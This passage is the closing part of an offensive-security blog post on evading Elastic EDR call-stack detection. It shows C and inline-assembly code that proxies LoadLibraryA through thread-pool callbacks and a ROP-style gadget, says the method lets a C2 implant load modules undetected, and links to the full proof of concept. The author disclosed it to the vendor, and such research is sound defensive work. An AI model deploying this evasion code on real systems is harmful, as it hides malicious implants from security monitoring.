<span class="w">    </span><span class="n">NTDLL$TpAllocWork</span><span class="p">(</span><span class="o">&amp;</span><span class="n">WorkReturn</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">PTP_WORK_CALLBACK</span><span class="p">)</span><span class="n">WorkCallback</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Params</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
<span class="w">    </span><span class="n">NTDLL$TpPostWork</span><span class="p">(</span><span class="n">WorkReturn</span><span class="p">);</span>
<span class="w">    </span><span class="n">NTDLL$TpWaitForWork</span><span class="p">(</span><span class="n">WorkReturn</span><span class="p">,</span><span class="w"> </span><span class="n">FALSE</span><span class="p">);</span>
<span class="w">    </span><span class="n">NTDLL$TpReleaseWork</span><span class="p">(</span><span class="n">WorkReturn</span><span class="p">);</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">KERNEL32$GetModuleHandleA</span><span class="p">(</span><span class="n">libName</span><span class="p">);</span>

<span class="p">}</span>
</code></pre></div>

<p>The associated assembly stub has also been modified to accommodate the gadget's address passed as a new member of the parameter structure, as well as to allocate the stack space that will be freed by the gadget.</p>
<div class="codehilite"><pre><span></span><code><span class="nf">void</span><span class="w"> </span><span class="no">__attribute__</span><span class="p">((</span><span class="no">naked</span><span class="p">))</span><span class="w"> </span><span class="no">WorkCallback</span><span class="p">()</span>
<span class="err">{</span>
<span class="w">    </span><span class="nf">__asm__</span><span class="w"> </span><span class="no">__volatile__</span><span class="w"> </span><span class="p">(</span>
<span class="w">        </span><span class="err">"</span><span class="na">.intel_syntax</span><span class="w"> </span><span class="no">noprefix</span><span class="c1">;"   </span>
<span class="w">        </span><span class="err">"</span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">0x28</span><span class="c1">;"            // Counteract `add rsp, 28` in the gadget's epilogue; done in this function's "prologue"</span>
<span class="w">        </span><span class="err">"</span><span class="nf">mov</span><span class="w"> </span><span class="no">r10</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdx</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x8</span><span class="p">]</span><span class="c1">;"     // Put pLoadLibraryAddress into r10; will be called by the gadget</span>
<span class="w">        </span><span class="err">"</span><span class="nf">mov</span><span class="w"> </span><span class="no">r11</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdx</span><span class="w"> </span><span class="err">+</span><span class="w"> </span><span class="mi">0x10</span><span class="p">]</span><span class="c1">;"    // Put pGadgetAddress into r11; will be jumped to</span>
<span class="w">        </span><span class="err">"</span><span class="nf">mov</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rdx</span><span class="p">]</span><span class="c1">;"           // Put LibraryName into rcx, first agument to LoadLibraryA</span>
<span class="w">        </span><span class="err">"</span><span class="nf">xor</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="no">rdx</span><span class="c1">;"             // Null out rdx (second argument to LoadLibraryExA, already done by LoadLibraryA but to future-proof in case of a switch to LoadLibraryExA)</span>
<span class="w">        </span><span class="err">"</span><span class="nf">xor</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="no">r8</span><span class="c1">;"               // Null out r8 (third argument to LoadLibraryExA, already done by LoadLibraryA but to future-proof in case of a switch to LoadLibraryExA)</span>
<span class="w">        </span><span class="err">"</span><span class="nf">jmp</span><span class="w"> </span><span class="no">r11</span><span class="c1">;"                  // Jmp to the gadget, will not put this function's address in the call stack</span>
<span class="w">        </span><span class="err">"</span><span class="na">.att_syntax</span><span class="w"> </span><span class="no">prefix</span><span class="c1">;"</span>
<span class="w">    </span><span class="err">)</span><span class="c1">;</span>
<span class="err">}</span>
</code></pre></div>

<p>The visual way to show what will happen is this simplified diagram. As a reminder, every <code>call</code> will put an address in the calling module on the call stack, while a <code>jmp</code> will not.</p>
<p><img alt="Diagram of the execution flow" src="https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback2_0_diagram.png"></p>
<p>Let's run it and see! Once again, we'll shellcode-ify and load it in a debugger to observe the call stack:</p>
<p><img alt="Call stack now breaking the detection rule" src="https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback2_2_callstack.png"></p>
<p>As expected, we can see <code>dsdmo_10.0.26100.1882</code> right between <code>ntdll</code> and <code>kernelbase</code>, the signature is now broken.</p>
<p>When we run it outside the debugger, no alert is generated, the module is loaded, and the process does not get killed:</p>
<p><img alt="Running the shellcode with no detection" src="https://offsec.almond.consulting/images/evading-elastic-callstack-signatures/callback2_1_run.png"></p>
<h2>Conclusion</h2>
<p>This technique allows a C2 implant to fill a necessary use-case, loading a network module, without being detected by the Elastic EDR. It builds upon Chetan Nayak's PoC in <a href="https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/">Hiding in PlainSight part 1</a>, who himself had expanded it in <a href="https://0xdarkvortex.dev/hiding-in-plainsight/">Part 2</a> in order to be able to call functions with more than 4 parameters. I have not started looking into whether it's possible to use this technique to call functions with an arbitrary number of parameters, though if it were it would allow evading other rules based on the same logic, such as <a href="https://github.com/elastic/protections-artifacts/blob/6e9ee22c5a7f57b85b0cb063adba9a3c72eca348/behavior/rules/windows/defense_evasion_shellcode_fluctuation_via_callback.toml">Shellcode Fluctuation via CallBack</a> and <a href="https://github.com/elastic/protections-artifacts/blob/6e9ee22c5a7f57b85b0cb063adba9a3c72eca348/behavior/rules/windows/defense_evasion_windows_api_via_a_callback_function.toml">Windows API via a CallBack Function</a>.</p>
<p>Though this blog post uses a gadget found in a previous version of a DLL that is no longer available in the current version of Windows 11, it contains all information needed to find similar usable gadgets in current DLLs. The real challenge is finding a gadget that is stable across Windows versions. As we have seen, even if a gadget is stable for 10 years' worth of updates, it does not mean it cannot change on a random patch Tuesday. <a href="https://winbindex.m417z.com/">Winbindex</a> is an invaluable help for this, as it allows downloading revisions of the same DLL for all current and past Windows versions.</p>
<p>As I said in the intro, only one use-case is being filled here, the EDR will have many other opportunities to catch the shellcode.</p>
<p>I did give a heads up to Elastic before publishing this post. They have taken this technique into account and are working on updates to the detection rules to catch this.</p>
<p>The full PoC code is available on GitHub: <a href="https://github.com/AlmondOffSec/LibTPLoadLib">https://github.com/AlmondOffSec/LibTPLoadLib</a></p>
<h2>Shoutouts</h2>
<ul>
<li>
<p>Once again, Elastic for their policy of openness, and <a href="https://x.com/dez_">Joe Desimone</a> for the communication on this subject.</p>
</li>
<li>
<p><a href="https://aff-wg.org/">Raphael Mudge</a> for <a href="https://tradecraftgarden.org/crystalpalace.html">Crystal Palace</a> and the <a href="https://tradecraftgarden.org/tradecraft.html">Tradecraft Garden</a>.</p>
</li>
<li>
<p><a href="https://x.com/_RastaMouse/">Daniel Duggan</a> for <a href="https://github.com/rasta-mouse/LibTP">LibTP</a> and <a href="https://rastamouse.me/">his exploration of Crystal Palace's capabilities</a>.</p>
</li>
<li>
<p><a href="https://x.com/NinjaParanoid/">Chetan Nayak</a> for Hiding in PlainSight <a href="https://0xdarkvortex.dev/proxying-dll-loads-for-hiding-etwti-stack-tracing/">part 1</a> and <a href="https://0xdarkvortex.dev/hiding-in-plainsight/">part 2</a>.</p>
</li>
<li>
<p><a href="https://x.com/m417z">Michael Maltsev</a> for <a href="https://winbindex.m417z.com/">Winbindex</a>.</p>
</li>
<li>
<p>My coworkers, for their proofreading.</p>
</li>
</ul>

<p>&nbsp;</p>

		</div>
	</div>
</div></div></div></div>
</div></div></div>
				<div class="section section-page-footer">
					<div class="section_wrapper clearfix">

						<div class="column one page-pager">
													</div>

					</div>
				</div>

			</div>

			
		</div>

		
	</div>
</div>


<!-- mfn_hook_content_after --><!-- mfn_hook_content_after -->

	

</div>

<div id="Side_slide" class="right dark" data-width="250"><div class="close-wrapper"><a href="https://offsec.almond.consulting/evading-elastic-callstack-signatures.html#" class="close"><i class="icon-cancel-fine"></i></a></div><div class="extras"><div class="extras-wrapper"></div></div><div class="lang-wrapper"></div><div class="menu_wrapper"></div></div><div id="body_overlay"></div>
<a id="back_to_top" class="button button_js sticky scroll" href="https://offsec.almond.consulting/evading-elastic-callstack-signatures.html"><i class="icon-up-open-big"></i></a>

<!-- mfn_hook_bottom --><!-- mfn_hook_bottom -->




</body></html>